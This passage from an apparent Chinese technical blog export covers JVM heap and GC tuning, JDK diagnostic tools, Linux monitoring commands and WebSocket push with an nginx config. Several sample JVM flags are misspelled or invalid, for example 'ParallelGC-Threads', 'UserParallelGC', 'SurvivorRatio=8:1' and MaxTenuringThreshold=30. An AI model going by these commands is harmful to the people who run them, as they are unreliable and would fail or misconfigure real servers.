title="设置最小堆内存"></a>设置最小堆内存</h4><blockquote><p>-Xms</p></blockquote><p>JVM启动会先按照最小堆内存运行，然后尝试运行时申请更多内存。如果最小堆内存过小，就会频繁触发 GC。</p><p>包括 Minor GC和Full GC。</p><p>JVM 会试图将内存尽可能限制在 -Xms 中。因此，当内存实际使用量初级 -Xms 指定的大小时，会触发 Full GC。因此 -Xms 值设置为 -Xmx 可以减少GC的次数和耗时。</p><p>这个操作的前提是，需要预知系统内存使用量。</p><h4 id="设置新生代"><a href="#设置新生代" class="headerlink" title="设置新生代"></a>设置新生代</h4><blockquote><p>-Xmn</p></blockquote><p>设置一个较大的新生代会减少老年代的大小，这个参数对系统性能以及 GC 行为有很大的影响。新生代的大小一般设置为整个堆空间的 1/4 左右。</p><h4 id="设置持久代"><a href="#设置持久代" class="headerlink" title="设置持久代"></a>设置持久代</h4><blockquote><p>-XX:MaxPerSize</p></blockquote><p>持久代（方法区）不属于堆的一部分，持久代决定了系统可以支持多少个类定义和多少常量。如果使用了 CGlib 或者 Javassist 等动态字节码技术的程序，需要合理设置。</p><p>一般来说，设置为 64M 已经够用，如果出现溢出，可以设置为  128M。</p><p>如果 128M依然不能满足，不应该继续增加参数值。而是优化程序设计。</p><h4 id="设置线程栈"><a href="#设置线程栈" class="headerlink" title="设置线程栈"></a>设置线程栈</h4><blockquote><p>-Xss </p></blockquote><p>线程栈是线程的一块私有空间，决定了支持线程的数量。</p><p>如果线程栈的空间很大，则允许支持的线程数量就会减少，因此这个值需要合理设置。</p><p>由于堆的增加会挤占栈空间的大小，因此设置这个参数需要和堆大小合理取舍。</p><h4 id="堆的比例分配"><a href="#堆的比例分配" class="headerlink" title="堆的比例分配"></a>堆的比例分配</h4><p>新生代和S区域的比例</p><blockquote><p>-XX:SurviorRation=eden/s0=eden/s1</p></blockquote><h4 id="堆参数设置总结"><a href="#堆参数设置总结" class="headerlink" title="堆参数设置总结"></a>堆参数设置总结</h4><p><img src="/性能优化/performance/performance-overview/image-20200319125358200.png" alt="image-20200319125358200"></p><ul><li>-Xms：初始堆大小</li><li>-Xmx：最大堆大小</li><li>-Xss：线程栈的大小</li><li>-XX：NewSize：设置新生代大小</li><li>-XX：PermSize：永久区的初始值</li><li>-XX：MaxPermSize：永久区的最大值</li><li>-XX：MinHeapFreeRatio：设置堆空间最小空闲比例</li><li>-XX：MaxHeapFreeRatio：设置堆空间最大空闲比例</li><li>-XX：NewRatio：设置老年代与新生代的比例</li><li>-XX：SurviorRatio：新生代中eden区域survivior区的比例</li></ul><h3 id="垃圾收集基础"><a href="#垃圾收集基础" class="headerlink" title="垃圾收集基础"></a>垃圾收集基础</h3><h4 id="jdk-垃圾回收器设置策略"><a href="#jdk-垃圾回收器设置策略" class="headerlink" title="jdk 垃圾回收器设置策略"></a>jdk 垃圾回收器设置策略</h4><ul><li>OpenJDK  8 使用 Parallel GC </li><li>OpenJDK 8 提供了Parallel GC、CMS 和 G1 三种收集算法</li></ul><p>比较</p><ul><li>Parallel GC  JDK 默认设置，关注吞吐量，服务器调优优先推荐使用这个值</li><li>G1 关注暂停</li><li>CMS 关注 gc 时间</li></ul><h3 id="调优方法"><a href="#调优方法" class="headerlink" title="调优方法"></a>调优方法</h3><p>调优需要搞清楚自己想要什么，这是最重要的，通过基准测试，明白现状，结合硬件平台和业务类型调优。</p><p>调优往往有几个目的：</p><ul><li>提高吞吐量</li><li>减少停顿</li><li>出现内存泄漏、死锁等问题需要查找</li></ul><p>调优建立在一个合理的背景下，JDK 默认的设置能满足大部分场景需要，是比较均衡的，一般来说无需调优。兼顾内存分配的灵活性（多个java应用同时存在）、吞吐量、停顿时间。只有需要侧重调整的时候才需要调优。例如为了高吞吐量，内存分配灵活性就没意义了，让单个java应用初始堆大小直接设置为预期值，可以减少 gc 次数。另外为了高吞吐量，在服务器开发中停顿可以在一定程度上容忍，可以选择对提高吞吐量友好的 gc 回收器。</p><p>一般来说，提高吞吐量、减少停顿是比较矛盾的两个指标。</p><p>另外，应用性能下降和内存泄漏、死锁等问题有关，解决问题后，性能就会极大的提升。</p><h4 id="提高吞吐量配置方案"><a href="#提高吞吐量配置方案" class="headerlink" title="提高吞吐量配置方案"></a>提高吞吐量配置方案</h4><p>在服务器开发中，吞吐量比系统短时间停顿更重要，优先选用 Parallel GC ，合理设置堆大小。以 8G4U 的服务器来说，如果只部署单应用，可以参考以下参数：</p><pre><code class="shell">java -Xmx7800m -Xms7800 -Xmn4g -Xss128k -XX:+UseParallelGC -XX:ParallelGC-Threads=4 -XX:+UseParallelOldGC</code></pre><ul><li>-Xmx7800m -Xms7800 设置最大堆等于初始值，让内存全部给 java 应用使用，让最大堆等于初始值可以避免 运行初期堆内存不足造成的频繁GC。</li><li>-Xmn4g 这是新生代大小，这个需要结合程序设计，以及内存分析结果设置</li><li>-Xss128k 尽量减小线程栈，可以支持更多的线程</li><li>-XX:+UserParallelGC 新生代使用 UserParallelGC </li><li>-XX:+UserParallelOldGC 老年代使用 UserParallelGC </li></ul><h4 id="减低停顿时间的案例"><a href="#减低停顿时间的案例" class="headerlink" title="减低停顿时间的案例"></a>减低停顿时间的案例</h4><p>对于老年代使用 CMS G减低停顿。尽可能让对象留在新生代，然后被 Minor GC回收，因此设置 eden 和 survivor 区的比例为 8:1，让对象尽可能留在新生代，如果 survivor 不够用，会直接进入老年代。</p><pre><code class="shell">java -Xmx7800m -Xms7800 -Xmn4g -Xss128k  -XX:ParallelGC-Threads=4 -XX:+ConcMarkSweepGC -XX:+UseParNewGC -XX:SurvivorRatio=8:1 -XX:TargetSurvivor-Ratio=90 -XX:MaxTenuringThreshold=30</code></pre><ul><li>-Xmx7800m -Xms7800 -Xmn4g -Xss128k 设置堆和线程栈</li><li>-XX:+UseParNewGC 为新生代使用 ParallelGC</li><li>-XX:+ConcMarkSweepGC  整体使用 CMS</li><li>-XX:SurvivorRatio=8:1 Survivor 比例为 80%</li><li>-XX:TargetSurvivor-Ratio=90 Survivor可用比例，默认是 50%，如果超过这个值就会向老年代压缩。</li><li>-XX:ParallelGC-Threads=4 GC 回收线程</li><li>-XX:MaxTenuringThreshold=30 设置年轻对象进入老年代的阈值，默认是 15，就是15次 Minor GC依然存活就会进入老年代，这里设置为30，降低进入老年代的概率。</li></ul><h3 id="实用的-JVM-参数"><a href="#实用的-JVM-参数" class="headerlink" title="实用的 JVM 参数"></a>实用的 JVM 参数</h3><p>查看  GC 分配情况</p><blockquote><p>java -XX:+PrintGCDetails -version</p></blockquote><pre><code class="shell">[root@localhost ~]# java -XX:+PrintGCDetails -versionopenjdk version &quot;1.8.0_131&quot;OpenJDK Runtime Environment (build 1.8.0_131-b12)OpenJDK 64-Bit Server VM (build 25.131-b12, mixed mode)Heap PSYoungGen      total 17408K, used 922K [0x00000000ece00000, 0x00000000ee100000, 0x0000000100000000)  eden space 15360K, 6% used [0x00000000ece00000,0x00000000ecee6810,0x00000000edd00000)  from space 2048K, 0% used [0x00000000edf00000,0x00000000edf00000,0x00000000ee100000)  to   space 2048K, 0% used [0x00000000edd00000,0x00000000edd00000,0x00000000edf00000) ParOldGen       total 39936K, used 0K [0x00000000c6a00000, 0x00000000c9100000, 0x00000000ece00000)  object space 39936K, 0% used [0x00000000c6a00000,0x00000000c6a00000,0x00000000c9100000) Metaspace       used 2418K, capacity 4480K, committed 4480K, reserved 1056768K  class space    used 233K, capacity 384K, committed 384K, reserved 1048576K</code></pre><p>查看 GC 参数</p><pre><code class="shell">[root@localhost ~]# java -XX:+PrintCommandLineFlags -version-XX:InitialHeapSize=60045120 -XX:MaxHeapSize=960721920 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC openjdk version &quot;1.8.0_131&quot;OpenJDK Runtime Environment (build 1.8.0_131-b12)OpenJDK 64-Bit Server VM (build 25.131-b12, mixed mode)</code></pre><h4 id="开启-JIT-编译参数"><a href="#开启-JIT-编译参数" class="headerlink" title="开启 JIT 编译参数"></a>开启 JIT 编译参数</h4><blockquote><p>-XX:CompileThreadhold</p></blockquote><p>设置阈值，Java 代码进入 JIT 编译模型。</p><h4 id="堆-dump"><a href="#堆-dump" class="headerlink" title="堆 dump"></a>堆 dump</h4><blockquote><p>-XX: + HeapDumpOnOutOfMemoryError </p></blockquote><p>内存溢出时，dump 堆内存信息，还可以设置导出的位置</p><blockquote><p>-XX: HeapDumpPath </p></blockquote><h4 id="发生-OOM-时候执行一段脚本"><a href="#发生-OOM-时候执行一段脚本" class="headerlink" title="发生 OOM 时候执行一段脚本"></a>发生 OOM 时候执行一段脚本</h4><blockquote><p>-XX: OnOutOfMemoryError=./restart.sh</p></blockquote><p>可以在发生内存溢出时候重启服务, 或者通知</p><h3 id="常用的-JVM-工具"><a href="#常用的-JVM-工具" class="headerlink" title="常用的 JVM 工具"></a>常用的 JVM 工具</h3><h4 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h4><p>列出 java 的进程，类似于 ps 命令，不过只对 java 进程起作用，通过 jps 命令可以方便的查看 java 的进程启动类、传入参数和 JVM 参数等信息。</p><pre><code class="shell">[root@localhost software]# jps 29328 Jps1734 jenkins.war711 spring-boot-boilerplate.jar1502 UnixLauncher    </code></pre><p>参数 -m 可以输出传递给 Main 函数的参数:</p><p><code>`</code>shell g<br>1734 jenkins.war –logfile=/var/log/jenkins/jenkins.log –webroot=/var/cache/jenkins/war –daemon –httpPort=8000 –debug=5 –handlerCountMax=100 –handlerCountMaxIdle=20 –prefix=<br>711 spring-boot-boilerplate.jar –spring.profiles.active=dev<br>29369 Jps -m<br>1502 UnixLauncher start 9d17dc87   org.sonatype.nexus.karaf.NexusMain</p><pre><code>参数 -l 可以输出主函数的完整路径: ```    shell[root@localhost software]# jps -v 1734 jenkins.war -Dcom.sun.akuma.Daemon=daemonized -Djava.awt.headless=true -Djenkins.install.runSetupWizard=false -DJENKINS_HOME=/var/lib/jenkins711 spring-boot-boilerplate.jar29389 Jps -Dapplication.home=/opt/oracle/jdk1.8.0_131 -Xms8m1502 UnixLauncher -Dinstall4j.jvmDir=/opt/oracle/jdk1.8.0_131 -Dexe4j.moduleName=/usr/local/nexus/bin/nexus -XX:+UnlockDiagnosticVMOptions -Dinstall4j.launcherId=245 -Dinstall4j.swt=false -Di4jv=0 -Di4jv=0 -Di4jv=0 -Di4jv=0 -Di4jv=0 -Xms1200M -Xmx1200M -XX:MaxDirectMemorySize=2G -XX:+UnlockDiagnosticVMOptions -XX:+UnsyncloadClass -XX:+LogVMOutput -XX:LogFile=/usr/local/nexus/sonatype-work/nexus3/log/jvm.log -XX:-OmitStackTraceInFastThrow -Djava.net.preferIPv4Stack=true -Dkaraf.home=. -Dkaraf.base=. -Dkaraf.etc=etc/karaf -Djava.util.logging.config.file=etc/karaf/java.util.logging.properties -Dkaraf.data=/usr/local/nexus/sonatype-work/nexus3 -Djava.io.tmpdir=/usr/local/nexus/sonatype-work/nexus3/tmp -Dkaraf.startLocalConsole=false -Di4j.vpt=true</code></pre><p>参数  -v 可以显示传递给 JVM 的参数:</p><pre><code class="shell">[root@localhost software]# jps -v 29411 Jps -Dapplication.home=/opt/oracle/jdk1.8.0_131 -Xms8m1734 jenkins.war -Dcom.sun.akuma.Daemon=daemonized -Djava.awt.headless=true -Djenkins.install.runSetupWizard=false -DJENKINS_HOME=/var/lib/jenkins711 spring-boot-boilerplate.jar                  </code></pre><h4 id="jstat-命令"><a href="#jstat-命令" class="headerlink" title="jstat 命令"></a>jstat 命令</h4><p>jstat 可以查看某个 java 进程运行时的工具，非常强大，可以非常详细的查看 Java 应用程序的堆使用情况，以及 GC 情况。</p><p>例如，每秒钟统计一次类装载信息，共统计两次：</p><pre><code class="shell">[root@localhost software]# jstat -class -t 711 1000 2Timestamp       Loaded  Bytes  Unloaded  Bytes     Time          998981.4  14249 25586.8        0     0.0     127.05       998982.5  14249 25586.8        0     0.0     127.05</code></pre><p>查看 JIT 编译信息:</p><pre><code class="shell">[root@localhost software]# jstat -compiler -t 711Timestamp       Compiled Failed Invalid   Time   FailedType FailedMethod       999312.5     8453      2       0   115.88          1 org/springframework/core/annotation/AnnotatedElementUtils searchWithGetSemanticsInAnnotations    </code></pre><p>查看 GC 信息:</p><pre><code class="shell">[root@localhost software]# jstat -gc 711 S0C    S1C    S0U    S1U      EC       EU        OC         OU       MC     MU    CCSC   CCSU   YGC     YGCT    FGC    FGCT     GCT   14848.0 9728.0  0.0   9427.4 99840.0  26216.5   73728.0    54161.6   76544.0 72788.4 10240.0 9518.9     49    2.662   3      2.449    5.111</code></pre><p>查看 GC 和各个代的当前大小：</p><pre><code class="shell">[root@localhost software]# jstat -gccapacity 711 NGCMN    NGCMX     NGC     S0C   S1C       EC      OGCMN      OGCMX       OGC         OC       MCMN     MCMX      MC     CCSMN    CCSMX     CCSC    YGC    FGC  19456.0 313344.0 129536.0 14848.0 9728.0  99840.0    39936.0   626688.0    73728.0    73728.0      0.0 1116160.0  76544.0      0.0 1048576.0  10240.0     49     3</code></pre><p>查看新生代 gc 信息：</p><pre><code class="shell">[root@localhost software]# jstat -gcnew 711 S0C    S1C    S0U    S1U   TT MTT  DSS      EC       EU     YGC     YGCT  14848.0 9728.0    0.0 9427.4 15  15 14848.0  99840.0  26466.1     49    2.662</code></pre><p>查看老年代 gc 信息:</p><pre><code class="shell">[root@localhost software]# jstat -gcold 711   MC       MU      CCSC     CCSU       OC          OU       YGC    FGC    FGCT     GCT    76544.0  72788.4  10240.0   9518.9     73728.0     54161.6     49     3    2.449    5.111</code></pre><p>查看老年代容量信息:</p><pre><code class="shell">[root@localhost software]# jstat -gcoldcapacity 711   OGCMN       OGCMX        OGC         OC       YGC   FGC    FGCT     GCT       39936.0    626688.0     73728.0     73728.0    49     3    2.449    5.111</code></pre><p>查看 gc 信息:</p><pre><code class="shell">[root@localhost software]# jstat -gcutil 711  S0     S1     E      O      M     CCS    YGC     YGCT    FGC    FGCT     GCT     0.00  96.91  27.43  73.46  95.09  92.96     49    2.662     3    2.449    5.111</code></pre><h4 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h4><p>jinfo 可以查看应用的拓展参数，甚至修改。</p><p>查看是否开启 GC 信息打印:</p><pre><code class="shell">[root@localhost software]# jinfo -flag PrintGCDetails 711-XX:-PrintGCDetails</code></pre><p>说明没有开启 GC 信息的打印，通过 jinfo 临时开启:</p><pre><code class="shell">[root@localhost software]# jinfo -flag +PrintGCDetails 711[root@localhost software]# jinfo -flag PrintGCDetails 711-XX:+PrintGCDetails</code></pre><h4 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h4><p>用于 dump 出堆的快照和统计信息</p><pre><code class="shell">[root@localhost software]# jmap -histo 711 &gt; /tmp/711.txt[root@localhost software]# cat /tmp/711.txt  num     #instances         #bytes  class name----------------------------------------------   1:        139944       15081784  [C   2:         21776       14906296  [B   3:         10836       11056152  [I   4:           722       11023664  [J   5:        172795        5529440  java.util.HashMap$Node   6:        128993        3095832  java.lang.String   7:         33636        2959968  java.lang.reflect.Method   8:         70700        2262400  com.mysql.cj.conf.BooleanProperty   9:         15974        1987576  [Ljava.util.HashMap$Node;  10:         56835        1818720  java.util.concurrent.ConcurrentHashMap$Node  11:         15264        1685896  java.lang.Class</code></pre><p>更有用的是导出堆信息:</p><pre><code class="shell">[root@localhost software]# jmap -dump:format=b,file=./711.hprof 711Dumping heap to /opt/software/711.hprof ...Heap dump file created[root@localhost software]# ls711.hprof</code></pre><p>快照信息可以通过 Visual VM 和 jhat 命令分析。</p><h4 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h4><p>jhat 可以分析 jmap 导出的文件,然后启动一个 HTTP 服务器展示分析结果。</p><pre><code class="shell">[root@localhost software]# jhat 711.hprof Reading from 711.hprof...Dump file created Fri Mar 20 22:17:18 CST 2020Snapshot read, resolving...Resolving 1337950 objects...Chasing references, expect 267 dots...........................................................................................................................................................................................................................................................................Eliminating duplicate references...........................................................................................................................................................................................................................................................................Snapshot resolved.Started HTTP server on port 7000Server is ready.</code></pre><h4 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h4><p>可以打印出栈信息，包括线程、锁的信息，如果发现死锁信息，可以自动识别：</p><pre><code>[root@localhost software]# jstack -l 7112020-03-20 22:21:40Full thread dump OpenJDK 64-Bit Server VM (25.131-b12 mixed mode):&quot;Attach Listener&quot; #10160 daemon prio=9 os_prio=0 tid=0x00007f65840a8800 nid=0x74dc waiting on condition [0x0000000000000000]   java.lang.Thread.State: RUNNABLE   Locked ownable synchronizers:    - None&quot;lettuce-eventExecutorLoop-1-3&quot; #49 daemon prio=5 os_prio=0 tid=0x00007f65b92e7800 nid=0x934 waiting on condition [0x00007f65607e8000]   java.lang.Thread.State: WAITING (parking)    at sun.misc.Unsafe.park(Native Method)    - parking to wait for  &lt;0x00000000c7b3d718&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)    at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)    at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)    at io.netty.util.concurrent.SingleThreadEventExecutor.takeTask(SingleThreadEventExecutor.java:238)    at io.netty.util.concurrent.DefaultEventExecutor.run(DefaultEventExecutor.java:64)    at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:905)    at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)    at java.lang.Thread.run(Thread.java:748)   Locked ownable synchronizers:    - None</code></pre><h4 id="jstatd"><a href="#jstatd" class="headerlink" title="jstatd"></a>jstatd</h4><p>jstatd 可以启动一个远程调试端口，允许 jps、jstat 等工具远程访问，因为权限的原因，直接使用 jstatd 会报错。需要配置 policy 文件。</p><p>使用 vim 创建一个文件如下：</p><blockquote><p>vim jstatd.all.policy </p></blockquote><pre><code class="shell">grant codebase &quot;file:/opt/oracle/jdk1.8.0_131/lib/tools.jar&quot;{ permission java.security.AllPermission;};</code></pre><pre><code class="shell">[root@localhost ~]# jstatd -J-Djava.security.policy=./jstatd.all.policy</code></pre><p>默认开启端口 1099 </p><pre><code class="shell">[root@localhost ~]# jps localhost:109931136 Jps1734 jenkins.war711 spring-boot-boilerplate.jar1502 UnixLauncher</code></pre><p>这样可以让调试非常方便，同时可视化的分析工具也可以通过个 jstatd 提供的服务连接到需要分析的服务器。</p><h4 id="hprof-工具"><a href="#hprof-工具" class="headerlink" title="hprof 工具"></a>hprof 工具</h4><p>除了使用 jstatd  让目标服务器提供一个远程服务用于调试之外，还可以让 java 应用通过 agent 的方式启动，得到该应用的调试信息。</p><blockquote><p> Java -agentlib:hprof=heap=dump,format=b,file=/tmp/app.hprof -jar  xxx.jar</p></blockquote><p>除了 hprof 之外，市面上还有一些远程监控 java 应用的 apm 工具和平台，例如听云 apm。</p><h4 id="spring-actuator"><a href="#spring-actuator" class="headerlink" title="spring actuator"></a>spring actuator</h4><p>spring boot 的项目可以引入 spring-actuator，监控应用。actuator 功能之一就是导出堆信息 。</p><p>如果使用 maven 作为构建工具，引入包：</p><pre><code class="xml">    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;    &lt;/dependency&gt;</code></pre><p>spring-actuator 会提供很多用于度量项目的接口，其中可使用 heapdump 端口导出堆信息</p><blockquote><p>wget <a href="http://localhost:1001/monitor/actuator/heapdump" target="_blank" rel="noopener">http://localhost:1001/monitor/actuator/heapdump</a></p></blockquote><p>然后通过 VisualVM 或者 MAT 分析</p><h4 id="MAT-内存分析工具"><a href="#MAT-内存分析工具" class="headerlink" title="MAT  内存分析工具"></a>MAT  内存分析工具</h4><p>TODO</p><h4 id="VisualVM-分析工具"><a href="#VisualVM-分析工具" class="headerlink" title="VisualVM 分析工具"></a>VisualVM 分析工具</h4><p>TODO</p><h2 id="操作系统调优"><a href="#操作系统调优" class="headerlink" title="操作系统调优"></a>操作系统调优</h2><h3 id="linux-常用调优命令"><a href="#linux-常用调优命令" class="headerlink" title="linux 常用调优命令"></a>linux 常用调优命令</h3><h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h4><blockquote><p>top -hv | -bcHiOSs -d secs -n max -u|U user -p pid(s) -o field -w [cols</p></blockquote><p>使用 top 可以观察各个进程对 CPU 的占用和内存使用情况。</p><h4 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h4><p>sar 可以对内存和 CPU 的使用情况进行采样</p><p>统计 CPU 情况，每秒钟采样一次，共计采样 3 次</p><blockquote><p>Sar -u 1 3</p></blockquote><p>获取内存使用情况</p><blockquote><p>sar -r 1 3</p></blockquote><p>获取 I/O 信息</p><blockquote><p>L sar -b 1 3 </p></blockquote><h4 id="vmstart"><a href="#vmstart" class="headerlink" title="vmstart"></a>vmstart</h4><p>vm start 是一个功能更为齐全的工具，需要单独安装，也可以安装 busybox </p><blockquote><p>vmstat 1 3</p></blockquote><h4 id="Iostat"><a href="#Iostat" class="headerlink" title="Iostat"></a>Iostat</h4><blockquote><p>iostat 1 2</p></blockquote><p>可以查看CPU和磁盘IO信息</p><h4 id="pidstat"><a href="#pidstat" class="headerlink" title="pidstat"></a>pidstat</h4><p>可以查询某个线程的状态，找出那个线程造成了大量的IO、CPU使用率，然后通过 jps、jstack 分析该线程的 IO情况。</p><p>对线程 1520 cpu 使用率 每秒钟采样 1 次，总计采样 3次。</p><blockquote><p>pidstat -p 1520 -u 1 3</p></blockquote><p>对线程 1520 io 使用率 每秒钟采样 1 次，总计采样 3次。</p><blockquote><p>pidstat -p 1520 -d -t 1 3</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 性能优化 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>分布式授权</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/auth/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/auth/</url>
      
        <content type="html"><![CDATA[<p>分布式授权指的是多个系统之间统一由一个单点系统授权，采用的技术一般有 CAS、OAuth2，OAuth2采用较多。</p><h2 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h2>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 面试</title>
      <link href="/%E9%9D%A2%E8%AF%95/interview/java-2020-3-18/"/>
      <url>/%E9%9D%A2%E8%AF%95/interview/java-2020-3-18/</url>
      
        <content type="html"><![CDATA[<h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul><li>Java</li><li>MySQL</li><li>Sprint boot</li><li>redis</li><li>Auth2.0</li><li>Open ID</li><li>鉴权到 API 粒度</li></ul><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>一级缓存，大容量，高并发，高性能，VM到容器化改造，微服务，自动化测试，工程能力需要加强。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chrome 自带截图</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/chrome-screenshot/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/chrome-screenshot/</url>
      
        <content type="html"><![CDATA[<p>有时候网页截图比较麻烦，实际上 Chrome 有一个自带截图工具非常好用。</p><p>打开控制台后输入：<code>Control + Shift + P</code> 调出控制台命令，Mac 下使用 Command 代替 Control键。</p><p>输入 <code>Screen</code> Chrome 会出现截图相关的命令：</p><p><img src="/开发工具/tool/chrome-screenshot/image-20200315160324484.png" alt="image-20200315160324484"></p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>服务器推送方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/websocket/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/websocket/</url>
      
        <content type="html"><![CDATA[<p>在邮件、消息等场景下需要使用服务器推方案，用于在  web 上和用户实时交互。</p><p>一般有几种方案：</p><ol><li>HTTP 轮询</li><li>HTTP stram 或 polling 技术 （Comet 技术）</li><li>Websocket 技术</li><li>HTTP/2 Server push 技术</li></ol><h2 id="HTTP-轮询"><a href="#HTTP-轮询" class="headerlink" title="HTTP 轮询"></a>HTTP 轮询</h2><p>轮询的原理非常简单，让浏览器每隔几秒就向服务器发送一个请求，询问服务器是否有新的信息。</p><p>这种方案也是最早期的方案，带来的问题是服务器资源消耗较大。</p><p>连接的建立和销毁是比较耗费资源的行为。</p><h2 id="HTTP-stram-或-polling-技术-（Comet-技术）"><a href="#HTTP-stram-或-polling-技术-（Comet-技术）" class="headerlink" title="HTTP stram 或 polling 技术 （Comet 技术）"></a>HTTP stram 或 polling 技术 （Comet 技术）</h2><p>Comet 技术和轮询差不多，不过采取的是阻塞模型，方法是客户端发起一个请求后，服务器挂起，等到需要服务器推送数据时返回 http 数据。返回数据后，客户端再次发起请求。</p><p>这种技术会造成服务器线程长时间挂起，因此在服务器阻塞网络模型时性能变得非常差，因为这种方案一般没有兼容性的问题，可以在性能和实现成本上是一个比较好的取舍。</p><h2 id="WebSocket-技术"><a href="#WebSocket-技术" class="headerlink" title="WebSocket 技术"></a>WebSocket 技术</h2><p>WebSocket协议（RFC 6455）提供了一种标准化的浏览器、服务器双工通信方法，通过一个TCP连接在客户机和服务器之间建立全双工、双向的通信通道。它是一种不同于 HTTP 的 TCP 协议，但设计用于在 HTTP 上工作，使用端口 80 和 443。因为可以重用端口，可以重用现有的防火墙。</p><p>WebSocket交互从一个HTTP请求开始，该请求使用HTTP升级报头进行升级，切换 WebSocket协议。</p><p>Websocket 协议只是借用了 HTTP 协议作为协议切换，建立信道后 HTTP 不在有关系。</p><p>客户端发起协议切换请求：</p><pre><code class="http">GET /spring-websocket-portfolio/portfolio HTTP/1.1Host: localhost:8080Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: Uc9l9TMkWGbHFD2qnFHltg==Sec-WebSocket-Protocol: v10.stomp, v11.stompSec-WebSocket-Version: 13Origin: http://localhost:8080</code></pre><p>服务器成功切换协议后返回状态码 101 而非 200：</p><pre><code class="http">HTTP/1.1 101 Switching Protocols Upgrade: websocketConnection: UpgradeSec-WebSocket-Accept: 1qVdfYHU9hPOl4JYYNXF623Gzn0=Sec-WebSocket-Protocol: v10.stomp</code></pre><h3 id="WebSocket-和-HTTP-协议的关系"><a href="#WebSocket-和-HTTP-协议的关系" class="headerlink" title="WebSocket 和 HTTP 协议的关系"></a>WebSocket 和 HTTP 协议的关系</h3><p>尽管 WebSocket 被设计为与 HTTP 兼容，并从 HTTP 请求开始，但重要的是要理解这两个协议导致了非常不同的体系结构和应用程序编程模型。</p><p>在HTTP 和 REST 中，应用程序被建模为许多 url 。为了与应用程序交互，客户端访问这些url，请求-响应样式。服务器根据HTTP URL、方法和标头将请求路由到适当的处理程序。</p><p>相反，在WebSockets中，初始连接通常只有一个URL。随后，所有应用程序消息都在同一TCP连接上流动。这指向一个完全不同的异步、事件驱动的消息传递体系结构。</p><p>WebSocket 实际上是一种传输层协议，与 HTTP 不同，它不对消息的内容规定任何语义。这意味着，除非客户机和服务器在消息语义上达成一致，否则无法路由或处理消息。</p><p>WebSocket 客户端和服务器可以通过 HTTP 握手请求上的 <code>Sec-WebSocket-Protocol</code> 头协商使用更高级别的消息传递协议(例如，STOMP)。在这种情况下，他们需要制定自己的惯例。</p><h3 id="WebSocket-和-STOMP-协议"><a href="#WebSocket-和-STOMP-协议" class="headerlink" title="WebSocket 和 STOMP 协议"></a>WebSocket 和 STOMP 协议</h3><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><p>后端</p><p>Java：</p><p>SpringBoot</p><p>Nodejs</p><p>前端：</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>在合适的场景下使用 WebSocket</strong> </p><p>低延迟、高频率和高容量是 WebSocket 特点，如果应用对延迟要求并不高，WebSocket 会带来额外的编程复杂度，并不见得是比轮询更好地方案。</p><p><strong>反向代理和运营商网络要求</strong></p><p>如果 WebSocket 服务器运行在 web 服务器(例如nginx)之后，可能需要将其配置为将 WebSocket 升级请求传递给WebSocke t服务器。同样，如果应用程序在云环境中运行，请检查云提供商与 WebSocket 支持相关的说明。</p><pre><code class="nginx">server {      listen   80;      server_name example.com;      location / {        proxy_pass   http://127.0.0.1:8080/;  　　　　proxy_http_version 1.1;        proxy_read_timeout   3600s;        // 启用支持 websocket 连接        proxy_set_header Upgrade $http_upgrade;        proxy_set_header Connection &quot;upgrade&quot;;      }}</code></pre><p>需要特别注意的是，Nginx 等反向代理服务器一定要将 <code>Upgrade</code> 相关的头转发出去，否则无法建立起来连接。这个问题非常难调试。</p><pre><code class="nginx">       proxy_set_header Upgrade $http_upgrade;       proxy_set_header Connection &quot;upgrade&quot;;</code></pre><p><strong>wss 和 ws 协议头</strong></p><p>在建立连接时如果使用的 http 协议，则对应发送消息的协议为 ws，如果使用 https 协议建立的链接，则发送消息的协议为 wss。</p><p>同时需要注意，wss 还是需要配置相关证书。</p><p><strong>跨域</strong></p><p>WebSocket 协议没有同源策略，但是建立连接的 http 请求有同源策略，需要配置跨域访问。</p><h2 